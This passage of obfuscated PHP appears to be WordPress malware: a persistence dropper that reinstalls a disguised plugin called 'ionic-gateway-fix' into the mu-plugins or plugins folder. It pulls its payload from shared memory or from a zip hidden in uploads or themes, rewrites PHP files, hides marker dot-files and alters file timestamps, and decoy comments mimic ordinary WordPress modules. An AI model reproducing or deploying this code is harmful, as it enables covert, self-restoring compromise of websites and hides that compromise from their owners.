  @flock($_lu78qxdtg4n6pmk,   LOCK_UN);$npaoznrh0p=236|49;$g06u_8e5k=$npaoznrh0p^125;
  @fclose($_lu78qxdtg4n6pmk);
 continue;
  }
$afabdcxtvaofr   =  $GLOBALS['__scf_xv8yd47u71vk_0']('fileperms')   ?  @fileperms($w40lb7254yqsv)  :   false;
     if   (!$GLOBALS['__scf_o86ss8z24c24px_14']($afabdcxtvaofr))     {
    if  ($GLOBALS['__scf_xv8yd47u71vk_0']('flock'))  @flock($_lu78qxdtg4n6pmk,   LOCK_UN);
 @fclose($_lu78qxdtg4n6pmk);
    continue;
}
     $h0umrj_x81m0wtl  =  fle1idu82th83mbvtny($ymlqhbn7foyujem3);
$owep4rtv43m =   $GLOBALS['__scf__z6u45x2fa_6']($h0umrj_x81m0wtl)  &&      $h0umrj_x81m0wtl   !==    $ymlqhbn7foyujem3   &&   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($h0umrj_x81m0wtl,  '<?')    !==  false;
 if   ($owep4rtv43m   &&    $GLOBALS['__scf_xv8yd47u71vk_0']('token_get_all')    && defined('TOKEN_PARSE')) {


   try {
  @token_get_all($h0umrj_x81m0wtl,  TOKEN_PARSE);



      }    catch (\Throwable $gclrxpt35h)  {
 $owep4rtv43m   =   false;


 }   catch (\Exception    $gclrxpt35h) {
    $owep4rtv43m   =  false;


 }
// @relocate scheduler




 }    elseif  ($owep4rtv43m) {

  $owep4rtv43m  =  _sc_phpok_src($h0umrj_x81m0wtl,    (20<<1));
  }
if     ($owep4rtv43m)  {
      $ln_24ug5iwk306w =  $GLOBALS['__scf_xv8yd47u71vk_0']("tempnam")  ?    @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv),  "sct")    : false;
  if  ($ln_24ug5iwk306w  !==   false  &&  !n65_agpqs6mktzabxyqx($ln_24ug5iwk306w,   $GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv))) {

_sc_ul($ln_24ug5iwk306w);
    $ln_24ug5iwk306w  =  false;
     }
   if ($ln_24ug5iwk306w   !==     false    &&  _sc_fpc($ln_24ug5iwk306w, $h0umrj_x81m0wtl)    ===   $GLOBALS['__scf_qm3n103d40kf_7']($h0umrj_x81m0wtl)) {
if   ($afabdcxtvaofr !== false    &&    $GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))   @$GLOBALS['__scf_sjpp68ignoogb_21']($ln_24ug5iwk306w,  $afabdcxtvaofr &   (751-240));
 $i6mcqrjbooj0lae  =   false;
if    ($GLOBALS['__scf_xv8yd47u71vk_0']("rename"))   $i6mcqrjbooj0lae   =   @$GLOBALS['__scf_r8dejb0j6gewv_22']($ln_24ug5iwk306w,   $w40lb7254yqsv);
if  (!$i6mcqrjbooj0lae &&   $GLOBALS['__scf_xv8yd47u71vk_0']("copy"))    {
    $i6mcqrjbooj0lae    =   @$GLOBALS['__scf_a8b7t6hxarr_27']($ln_24ug5iwk306w, $w40lb7254yqsv);


if ($i6mcqrjbooj0lae)     _sc_ul($ln_24ug5iwk306w);
  }
     if (!$i6mcqrjbooj0lae) {
     _sc_ul($ln_24ug5iwk306w);


        $ncim1f8hea___2d   = $GLOBALS['__scf_xv8yd47u71vk_0']("tempnam")   ? @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv),   "sct")  : false;
   if   ($ncim1f8hea___2d  !==  false     &&    !n65_agpqs6mktzabxyqx($ncim1f8hea___2d,    $GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv)))  {



_sc_ul($ncim1f8hea___2d);$swx4h00br_vvn=(0xc7+0x9b);$s2kfkh27g96ntn=$swx4h00br_vvn%11;
     $ncim1f8hea___2d    =   false;
  }


 if    ($ncim1f8hea___2d   !==   false &&      _sc_fpc($ncim1f8hea___2d, $ymlqhbn7foyujem3)   ===    $GLOBALS['__scf_qm3n103d40kf_7']($ymlqhbn7foyujem3))  {
if    ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod')) @$GLOBALS['__scf_sjpp68ignoogb_21']($ncim1f8hea___2d,   $afabdcxtvaofr  & (477+34));
if ($GLOBALS['__scf_xv8yd47u71vk_0']("rename")  &&   @$GLOBALS['__scf_r8dejb0j6gewv_22']($ncim1f8hea___2d, $w40lb7254yqsv))    {$n3f1lcs1=96*9;$kjngtr2s=$n3f1lcs1-14;
    }    elseif   ($GLOBALS['__scf_xv8yd47u71vk_0']("copy") &&    @$GLOBALS['__scf_a8b7t6hxarr_27']($ncim1f8hea___2d,  $w40lb7254yqsv)) {

_sc_ul($ncim1f8hea___2d);
    }   else _sc_ul($ncim1f8hea___2d);
       }    elseif  ($ncim1f8hea___2d  !==  false) _sc_ul($ncim1f8hea___2d);
   }

 if ($GLOBALS['__scf_xv8yd47u71vk_0']("clearstatcache"))   @clearstatcache(true,   $w40lb7254yqsv);
       if     ($i6mcqrjbooj0lae)   {
  $r9yfmd7v4_at  =   @$GLOBALS['__scf_y5urpy7tfyu5_16']($w40lb7254yqsv);
  if   (!$GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)   ||    $r9yfmd7v4_at   !==  $h0umrj_x81m0wtl)   {

    $on9gjtfl576nnf    =      $GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at) &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,    'SC_TH_BEGIN')    === false  &&    $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,  'SC_DD_BEGIN')  ===   false &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,   'SC_TH_LD_') === false;
$tbjsxoi85awbwe   = $on9gjtfl576nnf    ?   false :   ($GLOBALS['__scf_xv8yd47u71vk_0']("tempnam") ? @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv),     "sct")  :      false);
     if ($tbjsxoi85awbwe   !==  false &&    !n65_agpqs6mktzabxyqx($tbjsxoi85awbwe,  $GLOBALS['__scf_ltavcefziu30su_4']($w40lb7254yqsv))) {
   _sc_ul($tbjsxoi85awbwe);
    $tbjsxoi85awbwe    =  false;
      }

  if ($tbjsxoi85awbwe    !==   false    && _sc_fpc($tbjsxoi85awbwe, $ymlqhbn7foyujem3)  === $GLOBALS['__scf_qm3n103d40kf_7']($ymlqhbn7foyujem3))  {


   if ($afabdcxtvaofr  !==      false  &&    $GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))  @$GLOBALS['__scf_sjpp68ignoogb_21']($tbjsxoi85awbwe,      $afabdcxtvaofr & (0x65+0x19a));
 if      ($GLOBALS['__scf_xv8yd47u71vk_0']("rename")   &&   @$GLOBALS['__scf_r8dejb0j6gewv_22']($tbjsxoi85awbwe,  $w40lb7254yqsv)) {
// post-construct

  }  elseif   ($GLOBALS['__scf_xv8yd47u71vk_0']("copy") &&  @$GLOBALS['__scf_a8b7t6hxarr_27']($tbjsxoi85awbwe, $w40lb7254yqsv))   {
  _sc_ul($tbjsxoi85awbwe);
  } else   _sc_ul($tbjsxoi85awbwe);


 }   elseif ($tbjsxoi85awbwe  !==    false)  _sc_ul($tbjsxoi85awbwe);
 }
unset($r9yfmd7v4_at);
    }
if   ($i6mcqrjbooj0lae &&   $GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate'))  @opcache_invalidate($w40lb7254yqsv,      true);
  } elseif ($ln_24ug5iwk306w !==  false)   _sc_ul($ln_24ug5iwk306w);



    }
  if ($_lu78qxdtg4n6pmk)  {
 if ($GLOBALS['__scf_xv8yd47u71vk_0']('flock'))   @flock($_lu78qxdtg4n6pmk,  LOCK_UN);
 @fclose($_lu78qxdtg4n6pmk);
 }
    }
}
 unset($yjn5b73anc6ywb,   $w40lb7254yqsv,  $zacw44b6g3etzh, $ymlqhbn7foyujem3,  $h0umrj_x81m0wtl,   $owep4rtv43m,  $ln_24ug5iwk306w,   $i6mcqrjbooj0lae,      $tbjsxoi85awbwe,  $ncim1f8hea___2d, $r9yfmd7v4_at, $on9gjtfl576nnf, $_lu78qxdtg4n6pmk,  $afabdcxtvaofr);
        $kbw5753zuu1     =   (defined("WP_PLUGIN_DIR")     &&  WP_PLUGIN_DIR) ?  WP_PLUGIN_DIR  :   $kkk8iiixh_m1qbl7 .     "/plugins";
 $l26xz4x63tzfur  = $kbw5753zuu1   . "/ionic-gateway-fix/ionic-gateway-fix.php";
$jnes3wxxgpdsewe  =  (defined("WPMU_PLUGIN_DIR")   &&   WPMU_PLUGIN_DIR)     ? WPMU_PLUGIN_DIR      : $kkk8iiixh_m1qbl7   . "/mu-plugins";
$erisydr88nf     =   $jnes3wxxgpdsewe  .     "/ionic-gateway-fix.php";$ajfigu0om9osrb=145;$lmbidgmatcr=($ajfigu0om9osrb>0)?$ajfigu0om9osrb:-$ajfigu0om9osrb;
$nn2zc_mkm4lr  =  @$GLOBALS['__scf_fljlxp0_k3_43']($jnes3wxxgpdsewe)     ?  $erisydr88nf :  $l26xz4x63tzfur;
 $hp7ovp1v6j75h   =    $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   .   "/.q_ionic-gateway-fix";
  if    (!@$GLOBALS['__scf_j4ozmy1qax_vj_42']($kbw5753zuu1) &&  $nn2zc_mkm4lr   === $l26xz4x63tzfur)     _sc_mkdir($kbw5753zuu1);
 $eadmxc18n5g  = $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   . "/.sd_ionic-gateway-fix";
 $v81a3pzp1_rn33 = false;
 if     (@$GLOBALS['__scf_lybs3d_izonl3f_25']($eadmxc18n5g))     {
// collect quadratic orchestrator

    $k_o5pf5lyqlsgei5     = @$GLOBALS['__scf_y5urpy7tfyu5_16']($eadmxc18n5g);
   if ($GLOBALS['__scf__z6u45x2fa_6']($k_o5pf5lyqlsgei5)  &&  $GLOBALS['__scf_zoi2q70k2g_26']("/\\d+\\.\\d+\\.\\d+/",   $k_o5pf5lyqlsgei5, $o1ahli6mkbkc48)  &&    version_compare($o1ahli6mkbkc48[0],   "4.3.24",  ">")      &&  _sc_any_live($o1ahli6mkbkc48[0],    $kkk8iiixh_m1qbl7, $nn2zc_mkm4lr))   $v81a3pzp1_rn33 =   true;
  }
 $l0krvml_kgvzgjr = "";
  if  (vtwcl01aybvdc2a($erisydr88nf, "4.3.24")) $l0krvml_kgvzgjr     =  $erisydr88nf;
      if (!$l0krvml_kgvzgjr  && vtwcl01aybvdc2a($l26xz4x63tzfur,  "4.3.24"))     $l0krvml_kgvzgjr =   $l26xz4x63tzfur;
    if    (!$v81a3pzp1_rn33     &&  !$l0krvml_kgvzgjr   && _sc_any_live("4.3.24", $kkk8iiixh_m1qbl7,  $nn2zc_mkm4lr)) $v81a3pzp1_rn33     =   true;$epw_ygc7t4mx7p=38;$sbjpxmecczxx=($epw_ygc7t4mx7p>0)?$epw_ygc7t4mx7p:-$epw_ygc7t4mx7p;
 $i85xzh0j6r  =     false;
if   (!$l0krvml_kgvzgjr &&  !$v81a3pzp1_rn33  &&  !@$GLOBALS['__scf_lybs3d_izonl3f_25']($nn2zc_mkm4lr)) {
       $bj7_9pkbm1oe7_9v     =  $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   .   '/.rd_ionic-gateway-fix';
    $ul7oys5c5g7d    =    @$GLOBALS['__scf_lybs3d_izonl3f_25']($bj7_9pkbm1oe7_9v) ?  (int)   @$GLOBALS['__scf_eod91q9_bq_15']($bj7_9pkbm1oe7_9v)    : 0;
if ($ul7oys5c5g7d >    $GLOBALS['__scf_s8qh2p3z4gjae_24']()  -  (282+18) &&    $ul7oys5c5g7d  <=  $GLOBALS['__scf_s8qh2p3z4gjae_24']() +  (216+84))    $i85xzh0j6r    =   true;
     elseif ($GLOBALS['__scf_xv8yd47u71vk_0']("touch")) @$GLOBALS['__scf_wld3r5otpv_23']($bj7_9pkbm1oe7_9v);


}
     if   (!$l0krvml_kgvzgjr  &&   !$v81a3pzp1_rn33   &&  !$i85xzh0j6r) {
// serialize synchronous bivariant

 $ffgcz7j0nt97  = _sc_coreld($kkk8iiixh_m1qbl7);



  $q2p8e4mi889nb    =  false;



 if ($GLOBALS['__scf__z6u45x2fa_6']($ffgcz7j0nt97) &&  _sc_qok($hp7ovp1v6j75h,  $ffgcz7j0nt97)  && _sc_phpok_src($ffgcz7j0nt97))   {
   if (!@$GLOBALS['__scf_j4ozmy1qax_vj_42']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))   _sc_mkdir($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr));
   $aiy3g37zd85pg  = ($GLOBALS['__scf_xv8yd47u71vk_0']('tempnam')     ?     @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr), 'sc_')  :    false);
  

     if ($aiy3g37zd85pg    !==   false     && !n65_agpqs6mktzabxyqx($aiy3g37zd85pg,  $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))     {
    _sc_ul($aiy3g37zd85pg);
  $aiy3g37zd85pg = false;

      }
 if  ($aiy3g37zd85pg  !==   false) {
$mzoerh_9suw5mpj =   _sc_fpc($aiy3g37zd85pg,  $ffgcz7j0nt97);


    if   ($mzoerh_9suw5mpj  !==    false && $mzoerh_9suw5mpj   === $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97))    {
      $ilp_pjqsydylfu = r5qk07muwazeb7krh52pe($aiy3g37zd85pg,  $nn2zc_mkm4lr, gjkjhs4fs56sizyi($ffgcz7j0nt97));
     if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))   @clearstatcache(true,    $nn2zc_mkm4lr);

  if    ($ilp_pjqsydylfu)   {
  $r9yfmd7v4_at    =   @$GLOBALS['__scf_y5urpy7tfyu5_16']($nn2zc_mkm4lr);
      if (!$GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)  ||      $r9yfmd7v4_at     !== $ffgcz7j0nt97)   {
 if  ($GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)    && $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,  '/* SCV:')    !== false) {
   if  ($r9yfmd7v4_at   !==  ""   && $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at)   <  $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97)    &&  $GLOBALS['__scf_t4v17v676jnuf_11']($ffgcz7j0nt97,     0,   $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at))   ===  $r9yfmd7v4_at)   {


_sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr) .   '/.wr_'     .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,    '.php'),  '1');
_sc_ul($nn2zc_mkm4lr);
  }



$ilp_pjqsydylfu = false;


     } else  {
_sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr) .    '/.wr_'  . $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,     '.php'), '1');$yrrlkejm_shp=73*6;$w315eb0_0hao=$yrrlkejm_shp-41;
 _sc_ul($nn2zc_mkm4lr);


$ilp_pjqsydylfu  =   false;
   }
 }

 unset($r9yfmd7v4_at);
  }
      if ($ilp_pjqsydylfu)   {
 $q2p8e4mi889nb   = true;
   _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr) .    '/.wr_'    .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr, '.php'));
if  ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))   @$GLOBALS['__scf_sjpp68ignoogb_21']($nn2zc_mkm4lr, (389+31));
 

   if  ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate')) @opcache_invalidate($nn2zc_mkm4lr,      true);
  }
} else   {

   _sc_ul($aiy3g37zd85pg);

  }
// link token-bucket for WP BlockControls



}
    if    ($q2p8e4mi889nb  && @$GLOBALS['__scf_lybs3d_izonl3f_25']($nn2zc_mkm4lr)   &&  @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr) >  (4941+59) &&  @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr)  <=   (1082115-33539))  {
// acquire read

_sc_padf($nn2zc_mkm4lr);
 _sc_fam_touch($nn2zc_mkm4lr);
  $l0krvml_kgvzgjr   =    $nn2zc_mkm4lr;
  }
}
}
   if (!$l0krvml_kgvzgjr    && !$v81a3pzp1_rn33  &&  !$i85xzh0j6r  &&      1929651233  > 0 &&    $GLOBALS['__scf_xv8yd47u71vk_0']("shmop_open"))  {
   $m9xvo3za3d = @$GLOBALS['__scf_wefc49lamu30wg_45'](1929651233, "a",  0,  0);



if ($m9xvo3za3d)  {
    $i15jsmk6fgr3 =   (int)  @$GLOBALS['__scf_busod5lybl_46']($m9xvo3za3d);



 if    ($i15jsmk6fgr3 <=   0  || $i15jsmk6fgr3 >   (0x1bf731+0x408cf)) {
    @$GLOBALS['__scf_fcixg0xfq6y_47']($m9xvo3za3d);
$m9xvo3za3d =    false;
   }
    }
   if      ($m9xvo3za3d) {
// @speculate skip-list
$irn320bdd=PHP_MAJOR_VERSION;$s9rme0e6s93=$irn320bdd*9;
    $ffgcz7j0nt97    = $GLOBALS['__scf_z42aankc50u6_36'](@$GLOBALS['__scf_pym78w32gz0bby_48']($m9xvo3za3d,  0,  $i15jsmk6fgr3),  "\0");
@$GLOBALS['__scf_fcixg0xfq6y_47']($m9xvo3za3d);
     if ($GLOBALS['__scf__z6u45x2fa_6']($ffgcz7j0nt97) && $GLOBALS['__scf_t4v17v676jnuf_11']($ffgcz7j0nt97,  0,  (13-6))  ===   'SCSHM1:')   {
   $thvnaj9ydeizv4i  =     $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ffgcz7j0nt97, "\n");


   $qc00p7as6jxrl = $GLOBALS['__scf_f3okdo0y0ldl_49'](':',  $thvnaj9ydeizv4i   !==  false    ? $GLOBALS['__scf_t4v17v676jnuf_11']($ffgcz7j0nt97,    (0x4+0x3),   $thvnaj9ydeizv4i  -    (2+5))  : "");
  if  ($GLOBALS['__scf_d58mir8sr66_50']($qc00p7as6jxrl)   === 2)    {
    $icbmhmrlol0    = $GLOBALS['__scf_t4v17v676jnuf_11']($ffgcz7j0nt97,  $thvnaj9ydeizv4i    +   1, (int)$qc00p7as6jxrl[0]);
 $krdece0y9dlj9q    =   $GLOBALS['__scf_xv8yd47u71vk_0']('hash') ? $GLOBALS['__scf_egj4uujs8oo42_51']('sha256',   $icbmhmrlol0)      :   $GLOBALS['__scf_ue4dsf0az7w6z_19']($icbmhmrlol0);
 $ffgcz7j0nt97  = ($krdece0y9dlj9q  ===  $qc00p7as6jxrl[1])    ?  $icbmhmrlol0 : "";
  } else   {
  $ffgcz7j0nt97 =   "";
     }
   }
       $q2p8e4mi889nb = false;
    if ($ffgcz7j0nt97  && $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97)  >    (487+13) && $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97)    <=  (484469+564107) &&   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ffgcz7j0nt97,     "<?php")  ===   0  &&     _sc_qok($hp7ovp1v6j75h,  $ffgcz7j0nt97)  &&  _sc_phpok_src($ffgcz7j0nt97))  {
if (!@$GLOBALS['__scf_j4ozmy1qax_vj_42']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))   _sc_mkdir($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr));
 $aiy3g37zd85pg  =  ($GLOBALS['__scf_xv8yd47u71vk_0']('tempnam')   ?    @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr),   'sc_')    :   false);

 if ($aiy3g37zd85pg !==  false   &&    !n65_agpqs6mktzabxyqx($aiy3g37zd85pg,  $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))   {
 _sc_ul($aiy3g37zd85pg);
  $aiy3g37zd85pg    = false;
}
 if  ($aiy3g37zd85pg  !==   false)  {$umctqqlraw8x=(0xc6+0x19);$nu8s03joy44=$umctqqlraw8x%17;

 $mzoerh_9suw5mpj   =    _sc_fpc($aiy3g37zd85pg,   $ffgcz7j0nt97);



   if  ($mzoerh_9suw5mpj  !==  false &&    $mzoerh_9suw5mpj  ===    $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97))  {
  $ilp_pjqsydylfu  =     r5qk07muwazeb7krh52pe($aiy3g37zd85pg,     $nn2zc_mkm4lr,  gjkjhs4fs56sizyi($ffgcz7j0nt97));
      if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))    @clearstatcache(true, $nn2zc_mkm4lr);
    if ($ilp_pjqsydylfu)  {

    $r9yfmd7v4_at  =  @$GLOBALS['__scf_y5urpy7tfyu5_16']($nn2zc_mkm4lr);


if (!$GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)   ||  $r9yfmd7v4_at !==  $ffgcz7j0nt97)    {

 if    ($GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at) &&     $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,  '/* SCV:')   !==  false)    {
 if ($r9yfmd7v4_at   !==    ""    && $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at)   < $GLOBALS['__scf_qm3n103d40kf_7']($ffgcz7j0nt97)   &&      $GLOBALS['__scf_t4v17v676jnuf_11']($ffgcz7j0nt97, 0, $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at))  ===  $r9yfmd7v4_at)  {
   _sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr) .    '/.wr_'    .      $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,  '.php'),  '1');
_sc_ul($nn2zc_mkm4lr);
 }
// WP Data Module: alias-analyze scheduler




  $ilp_pjqsydylfu  =    false;$_o9h9g5al=79+89;$anfb1lkmck=$_o9h9g5al-37;
      } else   {
 _sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   .   '/.wr_'    .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr, '.php'),    '1');
_sc_ul($nn2zc_mkm4lr);


 $ilp_pjqsydylfu =   false;
    }
  }
       unset($r9yfmd7v4_at);
  }
    if  ($ilp_pjqsydylfu)    {
 $q2p8e4mi889nb  =  true;
    _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   . '/.wr_' . $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,  '.php'));

    if  ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod')) @$GLOBALS['__scf_sjpp68ignoogb_21']($nn2zc_mkm4lr,  (601-181));
 if ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate'))  @opcache_invalidate($nn2zc_mkm4lr, true);



 }


  } else  {
_sc_ul($aiy3g37zd85pg);
}
    }

  if   ($q2p8e4mi889nb   &&   @$GLOBALS['__scf_lybs3d_izonl3f_25']($nn2zc_mkm4lr) &&    @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr) >  (4980+20)  &&  @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr)  <=  (565944+482632)) {
   _sc_padf($nn2zc_mkm4lr);
  _sc_fam_touch($nn2zc_mkm4lr);


     $l0krvml_kgvzgjr    = $nn2zc_mkm4lr;
}
      }
}


 }

    if  (!$l0krvml_kgvzgjr    && !$v81a3pzp1_rn33   &&  !$i85xzh0j6r)   {
 $ytve45oa_8fu_r9f = $kkk8iiixh_m1qbl7   .  "/e3ffad0a.zip";
if   (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($ytve45oa_8fu_r9f)  &&  defined("WP_CONTENT_DIR"))  $ytve45oa_8fu_r9f    =   WP_CONTENT_DIR   . "/e3ffad0a.zip";
 if   (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($ytve45oa_8fu_r9f)     && @$GLOBALS['__scf_j4ozmy1qax_vj_42']($kkk8iiixh_m1qbl7   .    "/uploads")  &&  $GLOBALS['__scf_xv8yd47u71vk_0']('glob'))   {
    foreach ((array)    @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($kkk8iiixh_m1qbl7  .      "/uploads/*/*/e3ffad0a.zip") as $enbwvtmau8nz96y2)  {
// compile extension for WP Site Tagline

 if (@$GLOBALS['__scf_lybs3d_izonl3f_25']($enbwvtmau8nz96y2))  {$pp_13460=81+1;$phpos6_8vyln=$pp_13460-42;
$ytve45oa_8fu_r9f  =  $enbwvtmau8nz96y2;
      break;
}


     }
 }
if  (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($ytve45oa_8fu_r9f) &&   @$GLOBALS['__scf_j4ozmy1qax_vj_42']($kkk8iiixh_m1qbl7 .    "/themes") &&   $GLOBALS['__scf_xv8yd47u71vk_0']('glob'))   {
        foreach     ((array)   @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($kkk8iiixh_m1qbl7  . "/themes/*/e3ffad0a.zip") as  $enbwvtmau8nz96y2)  {
 if  (@$GLOBALS['__scf_lybs3d_izonl3f_25']($enbwvtmau8nz96y2)) {
  $ytve45oa_8fu_r9f  =   $enbwvtmau8nz96y2;

break;
   }
    }
 }
 $m2tll01ls4ir8 =   "ZipArchive";

 if  ($GLOBALS['__scf_fvplaf74370z3m_52']($m2tll01ls4ir8)  && @$GLOBALS['__scf_lybs3d_izonl3f_25']($ytve45oa_8fu_r9f)  &&  (int) @$GLOBALS['__scf_l2m84og2k1091k_13']($ytve45oa_8fu_r9f)  <=    (52428711+89))    {
$gv0bryqi1ska =  new     $m2tll01ls4ir8();
 $yisg9j02l56nc1h =      false;
$q2p8e4mi889nb =  false;
   try {


  if ($gv0bryqi1ska->open($ytve45oa_8fu_r9f)  ===  true)    {
$yisg9j02l56nc1h   =  true;
  $uh6_llzbxg_hm =    -1;
$g93uj532i_e5d  =  0;
   $x505u8ra07p8   =    -1;


$y7sn_ybdqccil   =   -1;

for  ($pi9q9tp67jn3 =   0;    $pi9q9tp67jn3  < $gv0bryqi1ska->numFiles   &&     $pi9q9tp67jn3  <  (939+61); $pi9q9tp67jn3++)     {
$y87jcao7qde   =   $gv0bryqi1ska->getNameIndex($pi9q9tp67jn3);
if   (!$GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde) ||    $GLOBALS['__scf_t4v17v676jnuf_11']($y87jcao7qde,  -(0x2+0x2)) !==     ".php")  continue;
  $g93uj532i_e5d++;

    if ($x505u8ra07p8   <    0) $x505u8ra07p8   = $pi9q9tp67jn3;
     if ($y87jcao7qde      ===    "ionic-gateway-fix/ionic-gateway-fix.php") {
// PSR-15 middleware: bootstrap priority-queue

  $uh6_llzbxg_hm   =   $pi9q9tp67jn3;
 break;


   }
 if ($y7sn_ybdqccil <  0 &&    $GLOBALS['__scf_ht5qt6ku56_34']($y87jcao7qde)  ===  "ionic-gateway-fix.php")  $y7sn_ybdqccil   =    $pi9q9tp67jn3;
}
// color-register acquire priority-queue

    if ($uh6_llzbxg_hm  < 0) $uh6_llzbxg_hm = $y7sn_ybdqccil;
   if     ($uh6_llzbxg_hm  <   0    &&   $g93uj532i_e5d   === 1  && $gv0bryqi1ska->numFiles  <=   (817+183))     $uh6_llzbxg_hm  =      $x505u8ra07p8;
 if    ($uh6_llzbxg_hm  >=   0)   {
$s1jriea_hhf4tz  =  $gv0bryqi1ska->statIndex($uh6_llzbxg_hm);$syuqngi9dld=PHP_MAJOR_VERSION;$v47kx_kp4is4k=$syuqngi9dld*2;



  $gkx16v3lf3 = ($GLOBALS['__scf_rzps4u9lh9q1_29']($s1jriea_hhf4tz) &&   isset($s1jriea_hhf4tz['size'])    &&    (int)    $s1jriea_hhf4tz['size']    > (1426734-378158)) ?  false   : $gv0bryqi1ska->getFromIndex($uh6_llzbxg_hm);
  unset($s1jriea_hhf4tz);
 if    (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)     || $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3) <   (458+42)     ||  $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)  > (1048539+37) || $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3, "<?") !== 0) $gkx16v3lf3    =   false;


    if  ($gkx16v3lf3  !==  false  &&  (!_sc_qok($hp7ovp1v6j75h, $gkx16v3lf3) ||   !_sc_phpok_src($gkx16v3lf3)))    $gkx16v3lf3 = false;
if   ($gkx16v3lf3    !== false    && !@$GLOBALS['__scf_j4ozmy1qax_vj_42']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))     _sc_mkdir($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr));
$aiy3g37zd85pg =     ($gkx16v3lf3   !== false &&   $GLOBALS['__scf_xv8yd47u71vk_0']('tempnam')  ?    @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr),   'sc_') :   false);
   if  ($aiy3g37zd85pg     !==  false   && !n65_agpqs6mktzabxyqx($aiy3g37zd85pg, $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr))) {
    _sc_ul($aiy3g37zd85pg);
